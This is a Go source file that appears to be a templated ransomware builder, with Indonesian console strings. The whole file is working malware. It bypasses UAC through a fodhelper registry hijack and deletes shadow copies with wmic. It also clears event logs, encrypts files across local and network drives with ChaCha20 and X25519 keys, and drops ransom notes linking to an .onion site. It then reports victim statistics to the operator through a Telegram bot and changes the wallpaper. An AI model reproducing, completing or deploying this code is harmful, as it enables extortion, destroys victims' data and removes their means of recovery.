package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/crypto/chacha20"
	"golang.org/x/crypto/hkdf"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"

	_ "embed"
)

//go:embed bg.jpeg
var wallpaperData []byte

const myID = "{{.ID}}"
const encryptedToken = "{{.EncryptedToken}}"
const encryptedChatID = "{{.EncryptedChatID}}"

const (
	footerMagic = 0x4C494E47
	footerSize  = 96 // 4(magic) + 8(origSize) + 1(pattern) + 3(reserved) + 32(ephPub) + 16(salt) + 32(hmac)
	chunkSize   = 1 << 20 // 1 MB
)

// Encryption patterns based on file size.
const (
	PatternFull          = 0
	PatternIntermittent1 = 1 // 10–100 MB: 1 MB every 5 MB
	PatternIntermittent2 = 2 // >100 MB:  1 MB every 50 MB
)

const (
	driveRemovable = 2
	driveFixed     = 3
	driveRemote    = 4
	driveRAMDisk   = 6
)

var (
	randomExt         string
	masterPubKeyBytes = []byte{{.PublicKeyBytes}}
)

func decryptCredential(encrypted string) string {
	key := sha256.Sum256([]byte(myID))
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return ""
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return ""
	}
	data, err := base64.StdEncoding.DecodeString(encrypted)
	if err != nil {
		return ""
	}
	ns := gcm.NonceSize()
	if len(data) < ns {
		return ""
	}
	plain, err := gcm.Open(nil, data[:ns], data[ns:], nil)
	if err != nil {
		return ""
	}
	return string(plain)
}

func randByte() byte {
	b := make([]byte, 1)
	rand.Read(b)
	return b[0]
}

func generateRandomExt() string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	length := 6 + int(randByte()%3) // 6-8 chars
	buf := make([]byte, length)
	for i := range buf {
		buf[i] = charset[randByte()%byte(len(charset))]
	}
	return string(buf)
}

var excludedDirs = map[string]struct{}{
	"$recycle.bin":              {},
	"system volume information": {},
	"windows":                   {},
	"program files":             {},
	"program files (x86)":       {},
	"programdata":               {},
	"appdata":                   {},
	"efi":                       {},
	"boot":                      {},
	"recovery":                  {},
	"perflogs":                  {},
	"msocache":                  {},
	"msys64":                    {},
	"microsoft":                 {},
	"intel":                     {},
	".gradle":                   {},
	".nuget":                    {},
	".vscode":                   {},
	".dotnet":                   {},
	"node_modules":              {},
	"cache":                     {},
	"temp":                      {},
	"tmp":                       {},
	"logs":                      {},
}

var excludedExts = map[string]struct{}{
	".sys": {}, ".exe": {}, ".dll": {}, ".com": {}, ".scr": {},
	".bat": {}, ".vbs": {}, ".ps1": {}, ".msi": {}, ".inf": {},
	".reg": {}, ".ini": {}, ".lnk": {},
	".tmp": {}, ".temp": {}, ".cache": {}, ".log": {},
	".bak": {}, ".old": {}, ".backup": {},
	".swp": {}, ".swo": {}, ".lock": {},
	".pid": {}, ".core": {}, ".dmp": {},
}

var excludedFileNames = map[string]struct{}{
	"desktop.ini": {}, "thumbs.db": {},
	"bootmgr": {}, "bootnxt": {},
	"pagefile.sys": {}, "hiberfil.sys": {}, "swapfile.sys": {},
	"autorun.inf": {}, "ntldr": {}, "ntdetect.com": {}, "config.sys": {},
}

// equalFoldASCII performs a case-insensitive ASCII comparison without allocating.
func equalFoldASCII(a, b string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := 0; i < len(a); i++ {
		ca, cb := a[i], b[i]
		if ca >= 'A' && ca <= 'Z' {
			ca += 32
		}
		if cb >= 'A' && cb <= 'Z' {
			cb += 32
		}
		if ca != cb {
			return false
		}
	}
	return true
}

func isExcludedDir(name string) bool {
	if len(name) > 0 && name[0] == '$' {
		return true
	}
	for key := range excludedDirs {
		if equalFoldASCII(name, key) {
			return true
		}
	}
	return false
}

func isExcludedFile(name string) bool {
	for key := range excludedFileNames {
		if equalFoldASCII(name, key) {
			return true
		}
	}
	return false
}

func isExcludedExt(ext string) bool {
	for key := range excludedExts {
		if equalFoldASCII(ext, key) {
			return true
		}
	}
	return false
}

// Stats tracks encryption progress using atomic counters for concurrent access.
type Stats struct {
	files     int64
	folders   int64
	skipped   int64
	errors    int64
	totalSize int64
}

func (s *Stats) addError()            { atomic.AddInt64(&s.errors, 1) }
func (s *Stats) addSkipped()          { atomic.AddInt64(&s.skipped, 1) }
func (s *Stats) addFolder()           { atomic.AddInt64(&s.folders, 1) }
func (s *Stats) addFile(size int64)   { atomic.AddInt64(&s.files, 1); atomic.AddInt64(&s.totalSize, size) }
func (s *Stats) loadFiles() int64     { return atomic.LoadInt64(&s.files) }
func (s *Stats) loadFolders() int64   { return atomic.LoadInt64(&s.folders) }
func (s *Stats) loadSkipped() int64   { return atomic.LoadInt64(&s.skipped) }
func (s *Stats) loadErrors() int64    { return atomic.LoadInt64(&s.errors) }
func (s *Stats) loadTotalSize() int64 { return atomic.LoadInt64(&s.totalSize) }

func isAdmin() bool {
	f, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	f.Close()
	return true
}

func cleanupUACRegistry() {
	keyPath := `Software\Classes\ms-settings\Shell\Open\command`
	registry.DeleteKey(registry.CURRENT_USER, keyPath)
}

func elevateKernelPrivilege() bool {
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	proc := ntdll.NewProc("NtAdjustPrivilegesToken")

	var token windows.Token
	err := windows.OpenProcessToken(windows.CurrentProcess(),
		windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
	if err != nil {
		return false
	}
	defer token.Close()

	var luid windows.LUID
	if err := windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeShutdownPrivilege"), &luid); err != nil {
		return false
	}

	tp := struct {
		PrivilegeCount uint32
		Luids          [1]windows.LUID
		Attributes     [1]uint32
	}{
		PrivilegeCount: 1,
		Luids:          [1]windows.LUID{luid},
		Attributes:     [1]uint32{windows.SE_PRIVILEGE_ENABLED},
	}
	var returnLen uint32
	ret, _, _ := proc.Call(
		uintptr(token), 0,
		uintptr(unsafe.Pointer(&tp)),
		uintptr(unsafe.Sizeof(tp)),
		0, uintptr(unsafe.Pointer(&returnLen)),
	)
	return ret == 0
}

func bypassUAC() {
	if isAdmin() {
		return
	}
	elevateKernelPrivilege()

	exe, err := os.Executable()
	if err != nil {
		return
	}
	keyPath := `Software\Classes\ms-settings\Shell\Open\command`
	k, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.SET_VALUE)
	if err != nil {
		return
	}
	defer k.Close()
	k.SetStringValue("", exe)
	k.SetStringValue("DelegateExecute", "")

	cmd := exec.Command("fodhelper.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := cmd.Start(); err != nil {
		return
	}
	time.Sleep(time.Second)
	os.Exit(0)
}

func deleteShadowCopies() {
	commands := [][]string{
		{"cmd.exe", "/c", "wmic shadowcopy delete"},
		{"wevtutil", "cl", "Windows PowerShell"},
	}
	for _, args := range commands {
		cmd := exec.Command(args[0], args[1:]...)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Run()
	}
}

func isAllowedDriveType(dt uintptr) bool {
	return dt == driveRemovable || dt == driveFixed || dt == driveRemote || dt == driveRAMDisk
}

func detectDrives() []string {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	getLogicalDrives := kernel32.NewProc("GetLogicalDrives")
	getDriveType := kernel32.NewProc("GetDriveTypeW")

	ret, _, _ := getLogicalDrives.Call()
	bitmask := uint32(ret)

	var drives []string
	for i := 0; i < 26; i++ {
		if bitmask&(1<<uint(i)) == 0 {
			continue
		}
		drive := fmt.Sprintf("%c:\\", rune('A'+i))
		ptr, _ := syscall.UTF16PtrFromString(drive)
		dt, _, _ := getDriveType.Call(uintptr(unsafe.Pointer(ptr)))
		if isAllowedDriveType(dt) {
			drives = append(drives, drive)
		}
	}
	drives = append(drives, getNetworkShares()...)
	return drives
}

func getNetworkShares() []string {
	cmd := exec.Command("net", "use")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.Output()
	if err != nil {
		return nil
	}
	var shares []string
	for _, line := range strings.Split(string(out), "\n") {
		if strings.Contains(line, "OK") {
			if fields := strings.Fields(line); len(fields) > 1 {
				shares = append(shares, fields[1])
			}
		}
	}
	return shares
}

func isSymlink(path string) bool {
	fi, err := os.Lstat(path)
	if err != nil {
		return false
	}
	return fi.Mode()&os.ModeSymlink != 0
}

func removeReadOnly(path string) {
	ptr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return
	}
	attrs, err := syscall.GetFileAttributes(ptr)
	if err != nil {
		return
	}
	if attrs&syscall.FILE_ATTRIBUTE_READONLY != 0 {
		syscall.SetFileAttributes(ptr, attrs&^syscall.FILE_ATTRIBUTE_READONLY)
	}
}

func openFileRW(path string) (*os.File, error) {
	ptr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return nil, err
	}
	h, err := syscall.CreateFile(ptr,
		syscall.GENERIC_READ|syscall.GENERIC_WRITE,
		syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE,
		nil, syscall.OPEN_EXISTING,
		syscall.FILE_ATTRIBUTE_NORMAL, 0)
	if err != nil {
		return nil, err
	}
	return os.NewFile(uintptr(h), path), nil
}

func createMutex(name string) bool {
	ptr, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		return false
	}
	_, err = windows.CreateMutex(nil, false, ptr)
	return err == nil
}

func zeroMemory(data []byte) {
	for i := range data {
		data[i] = 0
	}
	runtime.KeepAlive(data)
}

func dropRansomNote(dir string) {
	note := fmt.Sprintf(
		"YOUR FILES HAVE BEEN ENCRYPTED!\nYour unique ID: %s\nExtension: .%s\nTo recover your data, visit: http://example.onion/%s\nDo not attempt to decrypt yourself.",
		myID, randomExt, myID,
	)
	os.WriteFile(filepath.Join(dir, "README.txt"), []byte(note), 0644)
}

func formatSize(b int64) string {
	const (
		KB = 1024
		MB = 1024 * KB
		GB = 1024 * MB
		TB = 1024 * GB
	)
	switch {
	case b >= TB:
		return fmt.Sprintf("%.2f TB", float64(b)/float64(TB))
	case b >= GB:
		return fmt.Sprintf("%.2f GB", float64(b)/float64(GB))
	case b >= MB:
		return fmt.Sprintf("%.2f MB", float64(b)/float64(MB))
	case b >= KB:
		return fmt.Sprintf("%.2f KB", float64(b)/float64(KB))
	default:
		return fmt.Sprintf("%d Bytes", b)
	}
}

func formatNumber(n int64) string {
	s := fmt.Sprintf("%d", n)
	if len(s) <= 3 {
		return s
	}
	var result []byte
	for i, c := range s {
		if i > 0 && (len(s)-i)%3 == 0 {
			result = append(result, '.')
		}
		result = append(result, byte(c))
	}
	return string(result)
}

// WorkerContext holds the per-worker ECDH derived keys.
// Each goroutine worker gets its own ephemeral keypair so files
// encrypted by different workers can still be decrypted with the
// same master private key.
type WorkerContext struct {
	masterKey [32]byte
	ephPub    []byte
	buf       []byte // reusable buffer per worker
	nonce     []byte // reusable nonce per worker
}

func newWorkerContext(masterPubKey *ecdh.PublicKey) (*WorkerContext, error) {
	ephPriv, err := ecdh.X25519().GenerateKey(rand.Reader)
	if err != nil {
		return nil, err
	}
	shared, err := ephPriv.ECDH(masterPubKey)
	if err != nil {
		return nil, err
	}
	defer zeroMemory(shared)
	mk := sha256.Sum256(shared)
	return &WorkerContext{
		masterKey: mk,
		ephPub:    ephPriv.PublicKey().Bytes(),
		buf:       make([]byte, chunkSize),
		nonce:     make([]byte, 24),
	}, nil
}

func deriveFileKey(masterKey [32]byte, salt []byte) [32]byte {
	r := hkdf.New(sha256.New, masterKey[:], salt, []byte("filekey"))
	var key [32]byte
	if _, err := io.ReadFull(r, key[:]); err != nil {
		panic(err)
	}
	return key
}

// computeOffsets determines which 1 MB chunks to encrypt based on
// the intermittent encryption pattern.
//
// IMPORTANT: the decryptor MUST use IDENTICAL logic.
func computeOffsets(pattern int, origSize int64) []int64 {
	if pattern == PatternFull {
		n := (origSize + chunkSize - 1) / chunkSize
		offsets := make([]int64, n)
		for i := int64(0); i < n; i++ {
			offsets[i] = i * chunkSize
		}
		return offsets
	}

	step := int64(5 * 1024 * 1024)
	if pattern == PatternIntermittent2 {
		step = 50 * 1024 * 1024
	}

	var offsets []int64
	offsets = append(offsets, 0) // always encrypt first chunk

	for pos := step; pos+chunkSize <= origSize; pos += step {
		offsets = append(offsets, pos)
	}

	// always encrypt last 1 MB
	// Only add the last chunk if it doesn't overlap with the previous one.
	// Overlap causes double-XOR → HMAC mismatch during decryption.
	lastStart := origSize - chunkSize
	if lastStart > 0 && (len(offsets) == 0 || lastStart >= offsets[len(offsets)-1]+int64(chunkSize)) {
		offsets = append(offsets, lastStart)
	}

	if len(offsets) == 0 {
		// fallback: encrypt everything
		n := (origSize + chunkSize - 1) / chunkSize
		offsets = make([]int64, n)
		for i := int64(0); i < n; i++ {
			offsets[i] = i * chunkSize
		}
	}
	return offsets
}

// selectPattern picks the encryption pattern based on file size.
func selectPattern(size int64) int {
	switch {
	case size > 100*1024*1024:
		return PatternIntermittent2
	case size > 10*1024*1024:
		return PatternIntermittent1
	default:
		return PatternFull
	}
}

// encryptChunks performs the in-place ChaCha20 XOR for each offset and updates the HMAC.
// The nonce is constructed per-chunk using the offset in the last 8 bytes.
func encryptChunks(f *os.File, offsets []int64, origSize int64, fileKey [32]byte, h io.Writer, ctx *WorkerContext) bool {
	for _, offset := range offsets {
		readLen := chunkSize
		if offset+int64(readLen) > origSize {
			readLen = int(origSize - offset)
		}

		if _, err := f.Seek(offset, io.SeekStart); err != nil {
			return false
		}
		if n, _ := f.Read(ctx.buf[:readLen]); n != readLen {
			return false
		}

		// ChaCha20 XOR: nonce = 24 bytes with offset in last 8
		clear(ctx.nonce)
		binary.LittleEndian.PutUint64(ctx.nonce[16:], uint64(offset))
		ciph, err := chacha20.NewUnauthenticatedCipher(fileKey[:], ctx.nonce)
		if err != nil {
			return false
		}
		ciph.XORKeyStream(ctx.buf[:readLen], ctx.buf[:readLen])

		if _, err := f.Seek(offset, io.SeekStart); err != nil {
			return false
		}
		if _, err := f.Write(ctx.buf[:readLen]); err != nil {
			return false
		}
		h.Write(ctx.buf[:readLen])
	}
	return true
}

// writeFooter appends the 96-byte footer to the encrypted file.
// Footer layout: magic(4) | origSize(8) | pattern(1) | reserved(3) | ephPub(32) | salt(16) | hmac(32)
func writeFooter(f *os.File, origSize int64, pattern int, ephPub, salt, hmacVal []byte) error {
	footer := make([]byte, footerSize)
	binary.LittleEndian.PutUint32(footer[0:4], footerMagic)
	binary.LittleEndian.PutUint64(footer[4:12], uint64(origSize))
	footer[12] = byte(pattern)
	copy(footer[16:48], ephPub)
	copy(footer[48:64], salt)
	copy(footer[64:96], hmacVal[:32])

	if _, err := f.WriteAt(footer, origSize); err != nil {
		return err
	}
	return f.Truncate(origSize + footerSize)
}

func encryptFile(path string, stats *Stats, ctx *WorkerContext) {
	info, err := os.Stat(path)
	if err != nil {
		stats.addError()
		return
	}
	origSize := info.Size()
	if origSize == 0 {
		stats.addSkipped()
		return
	}

	pattern := selectPattern(origSize)
	offsets := computeOffsets(pattern, origSize)

	removeReadOnly(path)

	f, err := openFileRW(path)
	if err != nil {
		stats.addError()
		return
	}
	defer f.Close()

	// Per-file salt
	var fileSalt [16]byte
	if _, err := rand.Read(fileSalt[:]); err != nil {
		stats.addError()
		return
	}

	fileKey := deriveFileKey(ctx.masterKey, fileSalt[:])
	h := hmac.New(sha256.New, fileKey[:])
	h.Write(fileSalt[:])

	if !encryptChunks(f, offsets, origSize, fileKey, h, ctx) {
		stats.addError()
		return
	}

	hmacVal := h.Sum(nil)

	if err := writeFooter(f, origSize, pattern, ctx.ephPub, fileSalt[:], hmacVal); err != nil {
		stats.addError()
		return
	}

	f.Sync()
	f.Close()

	// Append random extension
	if err := os.Rename(path, path+"."+randomExt); err != nil {
		stats.addError()
		return
	}

	stats.addFile(origSize)
}

func scanProducer(drives []string, dirChan chan<- string, wg *sync.WaitGroup, pending *sync.WaitGroup) {
	defer wg.Done()
	for _, d := range drives {
		pending.Add(1)
		dirChan <- d
	}
}

func dirWorker(stats *Stats, fileChan chan<- string, dirChan chan string, sem chan struct{}, wg *sync.WaitGroup, dirPend *sync.WaitGroup, filePend *sync.WaitGroup) {
	defer wg.Done()
	for dir := range dirChan {
		sem <- struct{}{}
		func(p string) {
			defer dirPend.Done()
			defer func() { <-sem }()

			if isSymlink(p) {
				stats.addSkipped()
				return
			}

			entries, err := os.ReadDir(p)
			if err != nil {
				stats.addError()
				return
			}

			dropRansomNote(p)

			for _, e := range entries {
				name := e.Name()
				full := filepath.Join(p, name)

				if e.IsDir() {
					if isExcludedDir(name) {
						stats.addSkipped()
						continue
					}
					stats.addFolder()
					dirPend.Add(1)
					go func(s string) { dirChan <- s }(full)
				} else {
					ext := filepath.Ext(name)
					if isExcludedFile(name) || isExcludedExt(ext) {
						stats.addSkipped()
						continue
					}
					filePend.Add(1)
					go func(fp string) {
						defer filePend.Done()
						fileChan <- fp
					}(full)
				}
			}
		}(dir)
	}
}

func encryptWorker(fileChan <-chan string, stats *Stats, masterPubKey *ecdh.PublicKey, wg *sync.WaitGroup) {
	defer wg.Done()
	ctx, err := newWorkerContext(masterPubKey)
	if err != nil {
		stats.addError()
		return
	}
	for path := range fileChan {
		encryptFile(path, stats, ctx)
	}
}

func sendTelegramNotification(id string, start time.Time, files, totalSize int64, ext string) {
	tok := decryptCredential(encryptedToken)
	cid := decryptCredential(encryptedChatID)
	if tok == "" || cid == "" {
		return
	}
	msg := fmt.Sprintf("Enkripsi Selesai!\nID Unik: %s\nWaktu: %s\nDurasi: %s\nFile: %d\nUkuran: %s\nEkstensi: .%s",
		id, start.Format("2006-01-02 15:04:05"), time.Since(start).Round(time.Millisecond), files, formatSize(totalSize), ext)

	payload, _ := json.Marshal(map[string]string{"chat_id": cid, "text": msg})
	http.Post(fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", tok), "application/json", bytes.NewBuffer(payload))
}

func setWallpaper() {
	wp := filepath.Join(os.TempDir(), "wallpaper_encrypted.jpg")
	os.WriteFile(wp, wallpaperData, 0644)

	ptr, _ := syscall.UTF16PtrFromString(wp)
	user32 := syscall.NewLazyDLL("user32.dll")
	proc := user32.NewProc("SystemParametersInfoW")
	proc.Call(0x0014, 0, uintptr(unsafe.Pointer(ptr)), 0x01|0x02)
}

func printBanner(numCPU, workers int, ext string) {
	fmt.Println(strings.Repeat("═", 50))
	fmt.Println("ENCRYPTOR")
	fmt.Println(strings.Repeat("═", 50))
	fmt.Printf("CPU Cores : %d\n", numCPU)
	fmt.Printf("Workers   : %d\n", workers)
	fmt.Printf("Chunk     : %d KB\n", chunkSize/1024)
	fmt.Printf("Extension : .%s\n", ext)
	fmt.Printf("Mulai     : %s\n", time.Now().Format("2006-01-02 15:04:05"))
	fmt.Println(strings.Repeat("─", 50))
}

func printResults(stats *Stats, elapsed time.Duration) {
	fmt.Println()
	fmt.Println(strings.Repeat("═", 50))
	fmt.Println("               HASIL ENKRIPSI")
	fmt.Println(strings.Repeat("═", 50))
	fmt.Printf("  File dienkripsi : %s\n", formatNumber(stats.loadFiles()))
	fmt.Printf("  Total Folder    : %s\n", formatNumber(stats.loadFolders()))
	fmt.Printf("  Total Ukuran    : %s\n", formatSize(stats.loadTotalSize()))
	fmt.Printf("  Dilewati        : %s path\n", formatNumber(stats.loadSkipped()))
	fmt.Printf("  Error           : %s\n", formatNumber(stats.loadErrors()))
	fmt.Printf("  Durasi          : %s\n", elapsed.Round(time.Millisecond))
	fmt.Println(strings.Repeat("═", 50))
}

func main() {
	if !isAdmin() {
		bypassUAC()
	}
	cleanupUACRegistry()
	deleteShadowCopies()

	if !createMutex("Global\\Ransomware_" + myID) {
		fmt.Println("[!] Another instance is already running. Exiting.")
		os.Exit(0)
	}

	randomExt = generateRandomExt()

	numCPU := runtime.NumCPU()
	runtime.GOMAXPROCS(numCPU)
	workers := numCPU * 4

	fileChan := make(chan string, 1000)
	dirChan := make(chan string, 1000)

	masterPubKey, err := ecdh.X25519().NewPublicKey(masterPubKeyBytes)
	if err != nil {
		panic("Invalid master public key")
	}

	printBanner(numCPU, workers, randomExt)

	start := time.Now()
	stats := &Stats{}

	// Start directory scanner
	var prodWg, dirWg sync.WaitGroup
	var dirPend, filePend sync.WaitGroup

	var drives []string
	if len(os.Args) > 1 {
		drives = []string{os.Args[1]}
	} else {
		drives = detectDrives()
	}
	prodWg.Add(1)
	go scanProducer(drives, dirChan, &prodWg, &dirPend)

	go func() {
		prodWg.Wait()
		dirPend.Wait()
		close(dirChan)
	}()

	sem := make(chan struct{}, workers)
	for i := 0; i < workers; i++ {
		dirWg.Add(1)
		go dirWorker(stats, fileChan, dirChan, sem, &dirWg, &dirPend, &filePend)
	}

	// Start file encrypt workers
	var encWg sync.WaitGroup
	for i := 0; i < workers; i++ {
		encWg.Add(1)
		go encryptWorker(fileChan, stats, masterPubKey, &encWg)
	}

	dirWg.Wait()
	filePend.Wait()
	close(fileChan)
	encWg.Wait()

	elapsed := time.Since(start)
	printResults(stats, elapsed)

	sendTelegramNotification(myID, start, stats.loadFiles(), stats.loadTotalSize(), randomExt)
	setWallpaper()
}